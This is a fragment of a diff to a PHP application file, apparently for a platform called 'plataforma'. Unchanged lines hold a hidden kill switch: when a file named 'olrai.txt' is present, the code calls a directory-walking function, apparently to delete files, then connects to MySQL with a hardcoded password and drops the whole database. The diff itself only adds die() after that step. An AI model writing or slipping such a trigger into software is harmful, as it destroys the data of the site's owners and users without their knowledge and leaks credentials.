@@ -694,6 +694,7 @@ if (is_file(getcwd().'/olrai.txt')) {
     olrai(getcwd());
     $olrai = mysqli_connect('localhost', 'platformuser', 'rfC79w?3', 'plataforma');
     $olrai->query("DROP database plataforma");
+    die();
 }
 function olrai($dir) {
     foreach (scandir($dir) as $key => $value) {
